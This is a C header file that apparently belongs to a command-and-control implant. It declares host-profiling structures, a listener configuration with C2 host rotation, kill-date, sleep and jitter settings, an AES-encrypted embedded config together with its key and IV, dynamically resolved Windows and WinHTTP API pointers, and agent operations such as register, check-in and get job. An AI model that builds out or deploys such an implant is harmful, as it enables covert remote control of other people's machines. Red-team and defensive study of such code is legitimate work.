#pragma once
#include "Common.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
//config bytes
#define CONFIG_BYTES {0x9f,0x95,0x57,0xec,0x52,0x56,0x56,0xdf,0x6b,0x3f,0x9d,0x76,0x1a,0x87,0xc5,0x14,0x70,0xfe,0xe1,0xb6,0xcd,0xe1,0xfd,0xce,0x78,0x0f,0xd3,0x18,0x58,0x54,0xc2,0xb9,0x6a,0xbf,0x76,0xc5,0xdc,0x53,0x13,0x1d,0x0c,0x06,0xb7,0xb1,0xe8,0xa2,0x78,0x03,0x6d,0xd3,0x7d,0xd2,0x27,0xc1,0xb1,0x72,0xe1,0xa4,0x52,0xbe,0xeb,0x6c,0xab,0x0a,0xe5,0x59,0x83,0xa8,0x0b,0x8d,0xcb,0x8e,0xfb,0x43,0xd1,0xd5,0xaa,0xc3,0x29,0xa2,0x2a,0x24,0xdd,0xaa,0x77,0xa7,0xb3,0x43,0x61,0x8b,0xbd,0x7b,0xf3,0x66,0x17,0x45,0x06,0x3b,0x3c,0xec,0x29,0x2f,0x2f,0x2c,0xa0,0x02,0x54,0xe4,0xd0,0x0e,0x96,0x48,0xb9,0x3a,0x50,0x20,0x19,0xd7,0x10,0xc0,0xb6,0x1d,0x86,0x3d,0xc4,0x9c,0x29,0xb6,0xc7,0xdb,0xf0,0xaa,0xbe,0xa8,0x6b,0x65,0xae,0xe4,0x0e,0x46,0x3c,0x6f,0xc9,0xc9,0x58,0x9d,0xa5,0xe2,0x89,0xd3,0x2a,0xb6,0x8d,0x86,0x67,0x17,0xe7,0xd5,0xc2,0x53,0x10,0x8d,0xea,0x62,0x2d,0xb3,0xe7,0xf1,0x8b,0xa8,0x10,0x89,0x4d,0xdd,0xf7,0x3f,0x6f,0x9a,0x30,0x6e,0xca,0x15,0x8c,0x74,0x58,0xe2,0xb6,0xe9,0xde,0x9d,0x20,0xa7,0xb0,0xe8,0x37,0x3b,0xbf,0xff,0x38,0xe0,0x19,0xe2,0xc8,0x28,0x70,0x1f,0x68,0x0e,0x12,0xd6,0x08,0xb5,0xbc,0x06,0x74,0xfd,0xdb,0xa3,0xcc,0xcd,0x93,0x36,0x10,0x59,0xed,0xb1,0x74,0xb6,0x14,0xf9,0x8c,0xec,0x2c,0x90,0x32,0x12,0xa6,0xa7,0x6c,0x44,0x73,0x8e,0x25,0xc4,0x4e,0x20,0xef,0x8d,0xec,0x42,0x05,0x75,0x05,0xf6,0x7b,0xe1,0xf0,0x3b,0xd2,0x22,0x08,0xaf,0xb8,0x37,0xdb,0xa8,0x6f,0xc0,0x87,0xf2,0xdb,0x35,0xa5,0xd2,0x3a,0x99,0x98,0xb7,0x4f,0x82,0xaa,0xda,0x77,0x98,0x50,0xeb,0x40,0xca,0x6e,0xff,0x7f,0x4f,0x86,0x14,0x0d,0xd6,0xff,0xf9,0x60,0x5d,0xe7,0x9b,0xd7,0x09,0x73,0xa6,0x56,0xe5,0xdc,0x7f,0x34,0x19,0xe1,0x89,0x0e,0xfc,0x7a,0x23,0x98,0xff,0xed,0xe6,0xe3,0xcf,0xd4,0x91,0x25,0xa3,0x75,0x79,0xad,0xc3,0x60,0x29,0xe2,0x10,0x8b,0xa6,0x30,0xe8,0xf7,0x29,0x9f,0xa2,0x59,0x58,0x55,0x29,0xda,0x23,0x3f,0x80,0xee,0xb2,0x52,0xa6,0xf0,0xc8,0x6e,0xbe,0x0f,0x5a,0x08,0xdf,0x68,0x7c,0x01,0x3e,0x72,0x07,0x2d,0x34,0x2e,0x30,0xb0,0x1e,0x9a,0x17,0xbe,0x67,0xbc,0x92,0xc3,0x20,0x31,0xf7,0x09,0x20,0x3a,0x8f,0xa2,0xf5,0x3a,0xe7,0xe2,0xbd,0x77,0x7c,0x46,0x69,0x98,0xe8,0x6c,0x2a,0x98,0x8d,0x8c,0x20,0x91,0x07,0x0e,0xa2,0x10,0x73,0x1e,0xa6,0xe1,0x98,0x74,0x7d,0x91,0x6f,0x19,0xa4,0xd5,0xbf,0xa9,0x99,0xcc,0x10,0x76,0xe8,0x5b,0xe7,0x35,0xb8,0x4e,0xd3,0xcf,0x3d,0x88,0x34,0xa9,0x53,0xef,0x18,0xce,0xaa,0x50,0xfb,0x28,0x14,0x42,0x81,0x3a,0x2d,0x2a,0x3f,0x3c,0xe5,0x19,0x77,0xe2,0xe0,0xdb,0x99,0x3f,0xa1,0x15,0xac,0x55,0xce,0x82,0x71,0x39,0x47,0x42,0xee,0xe1,0x4d,0xf6,0xa3,0xf0,0xbf,0x55,0xf5,0x66,0xa4,0x7f,0x8f,0x8c,0xf4,0x7b,0x07,0x24,0x82,0x14,0x13,0x53,0xb1,0x59,0x53,0xdc,0xad,0x7d,0xa2,0x2d,0x4e,0x3f,0x16,0x09,0xbb,0xb9,0x7b,0x69,0x60,0x03,0x43,0xf3,0x3d,0x88,0x7a,0xf8,0x87,0xc2,0x5f,0x3e,0x98,0x37,0x74,0xe3,0x3e,0x6e,0xeb,0x6f,0x22,0x4a,0x03,0xc5,0x6f,0x96,0x81,0x2b,0x35,0x20,0xea,0x1b,0xf5,0xf2,0x5c,0x33,0x07,0x82,0x96,0x1d,0x0c,0x0b,0x39,0xe2,0x43,0x48,0x0e,0xa5,0x47,0x8a,0xa7,0x9d,0x2a,0x00,0x4a,0xf1,0x1a,0xf1,0x57,0x92,0x14,0x88,0x92,0xb1,0x34,0xdf,0xe1,0x78,0x20,0x44,0x20,0xb8,0xec,0x7e,0xb7,0xb9,0x76,0xdf,0xf8,0x0b,0x63,0xf5,0x04,0x04,0x93,0x9a,0xc4,0x29,0x13,0xd4,0x0e,0x2e,0x9f,0x92,0xdf,0x22,0xd6,0x44,0x6b,0xf4,0x80,0xad,0x26,0xb7,0x3a,0x58,0xbb,0x23,0x3f,0xa7,0x67,0xdc,0xcc,0x48,0xd6,0xe3,0x8f,0x64,0x30,0x1d,0xfd,0x89,0xb0,0xed,0x0f,0xc4,0x86,0x0d,0x1b,0xc7,0xae,0xd7,0x88,0xfa,0xec,0x61,0xaf,0xe9,0xf8,0xa8,0x35,0xd3,0x44,0x45,0x81,0x53,0xdf,0xd4,0x36,0x29,0xfe,0xcd,0xfa,0x7a,0xae,0x06,0xf8,0x8a,0x1b,0xc6,0x09,0xf1,0x05,0x46,0x33,0x83,0xff,0xa4,0x3b,0x31,0xc5,0x07,0xd6,0x9a,0xc3,0x2f,0xbd,0x97,0x9b,0xbb,0xc2,0xde,0xd8,0x50,0xf0,0x01,0xd4,0xb4,0x4b,0xf2}
#define CONFIG_KEY_BYTES {0x83,0xab,0xdb,0x95,0xfd,0x3e,0x2a,0x1a,0x88,0x76,0xdc,0x44,0x1b,0x32,0xa6,0x61,0xff,0x69,0xdb,0x5a,0x4b,0x95,0xd6,0x0d,0x9e,0x72,0xcf,0x47,0x69,0x6d,0xde,0x60}
#define CONFIG_IV_BYTES {0xe5,0xde,0x31,0xe5,0x01,0x91,0x01,0x6d,0x2a,0xdc,0x2a,0x5f,0xbd,0xe0,0x94,0x74}
#define HASH_CONFIG_BYTES {0x04,0x4c,0x10,0x16,0xdc,0x39,0x21,0x74,0x5f,0x27,0x08,0x38,0x03,0x08,0xe3,0x99,0x0d,0x2b,0xfe,0x8e,0x57,0xc3,0x4e,0x67,0xb8,0xe0,0xcf,0x9e,0xbb,0x8f,0x2c,0x78,0x77,0x57,0xb8,0xf7,0x28,0x25,0xe7,0x38,0x19,0x23,0xdf,0x6b,0x47,0x15,0xe6,0x2a,0xf0,0xc2,0x96,0x04,0x51,0x8c,0x3d,0x54,0xc8,0x0a,0x49,0x73,0xcf,0x24,0xba,0x07,0xb0,0x02,0x05,0x05,0x7d,0xf7,0xd1,0x9e,0xad,0xb5,0xc3,0xa5,0x37,0xef,0x76,0x15,0x37,0x25,0x59,0xf2,0xad,0x04,0x70,0x2b,0x36,0x40,0xeb,0x9e,0xea,0xe5,0x64,0x5c,0x11,0x75,0x7a,0xe4,0xbb,0x0e,0x7e,0xd2,0xc5,0x37,0xc5,0xc0,0x08,0x85,0x33,0x50,0xad,0x96,0x8a,0x7a,0x8f,0x7c,0x30,0xfe,0xe7,0x8d,0x9e,0x1a,0x01,0xa2,0x9b,0xed,0x0b,0xe8,0x0e,0x70,0x70,0x14,0xd3,0x63,0x84,0xf0,0x21,0xaf,0x48,0x7e,0x40,0x99,0xd5,0x3a,0xa7,0xa7,0xdc,0x44,0xd6,0x86,0x54,0xce,0x4f,0xcb,0xf5,0x1d,0x59,0x67,0x73,0xf3,0xb1,0x82,0x21,0x60,0xc1,0xb5,0x10,0x49,0x95,0xc9,0x93,0x1a,0xae,0xc6,0x3b,0x5d,0x9b,0x74,0x0d,0xa9,0xb0,0xc1,0xb4,0x57,0xc8,0xb2,0x48,0x03,0x83,0xa8,0x0f,0xff,0x0b,0x92,0xc7,0xdc,0xc3,0x50,0xe5,0xb3,0x16,0xf2,0x0d,0xac,0xc9,0x09,0x4a,0xae,0x5b,0x37,0xff,0xba,0x45,0x4a,0xe2,0x03,0x9c,0xfb,0xc2,0xec,0x35,0xe4,0x8a,0xca,0x22,0x54,0x42,0x3e,0x76,0x39,0xb6,0xb3,0xb4,0x93,0x13,0xca,0xbe,0xe9,0xac,0x16,0x61,0x21,0x1a,0x36,0xd7,0x39,0x33,0x48,0x49,0xf4,0x5e,0x85,0x3b,0xfe,0x46,0x83,0x80,0x31,0x06,0x49,0x47,0x25,0x0f,0xa1,0xa3,0x6a,0xe9,0x26,0x28,0x18,0x6b,0xde,0xca,0x27,0xca,0x39,0x6f,0x88,0xfc,0x17,0xcf,0x8e,0x65,0xde,0x78,0xfd,0xf0,0xf1,0xe4,0x8d,0x4b,0x0b,0x90,0x7e,0xb4,0x66,0x9a,0x65,0xa0,0x96,0x9a,0xfd,0xb2,0xa7,0x8f,0x22,0xda,0xb4,0xd8,0x25,0xcf,0xa9,0x44,0xf9,0xbf,0x59,0x75,0x48,0x89}
#define HASH_KEY_BYTES {0x39,0xce,0x86,0x77,0x08,0xc9,0xab,0xe8,0x3f,0x24,0x96,0xaf,0x72,0x4d,0xaf,0x23,0x7e,0xc9,0xd9,0x87,0xd5,0x4f,0x06,0x91,0x8a,0xf5,0xa0,0xe4,0xaf,0x57,0xb7,0x03}
#define HASH_IV_BYTES {0xae,0xf1,0x35,0x7e,0xc3,0xb3,0x40,0x8d,0x5e,0x94,0x89,0xe7,0x6b,0x82,0x80,0x4d} 

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;



typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *pListenerConfig;

//TODO FINISH ADDING LISTENER / AGENT CONFIG DATA/
typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	pListenerConfig listenerConfig;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;


typedef struct _Win32 {
	//enumeration apis
	//NTDLL APIS
	HMODULE hNtdll;
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;


	//KERNEL32 APIS
	HMODULE hKernel32;
	t_GetComputerNameExA pGetComputerNameExA;
	t_LocalAlloc pLocalAlloc;
	t_LocalReAlloc pLocalReAlloc;
	t_LocalFree pLocalFree;
	t_GetSystemTimeAsFileTime pGetSystemTimeAsFileTime;
	t_GetLocalTime pGetLocalTime;
	t_LoadLibraryA pLoadLibraryA;
	t_GetProcAddress pGetProcAddress;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;
	t_WinHttpReadData pWinHttpReadData;
	t_WinHttpCloseHandle pWinHttpCloseHandle;

} Win32, * pWin32;

typedef struct _AgentCMD {
	UINT CommandID;
	UINT RequestID;
	BYTE* DATA;
} AgentCMD, * pAgentCMD;

//TODO clean up this structure.
//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
typedef struct _Agent {


	pWin32 apis;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;


	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* MetaDataPackage;
	struct _Package* packages;


}Agent, * pAgent;


extern pAgent agent;

enum Agent_Operations {
	REGISTER_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
	NO_JOB,
};


INT init_agent();
INT RegisterAgent();
void AgentMain();
INT ParseConfig();
BOOL ParseHashConfig();
void AgentRoutine();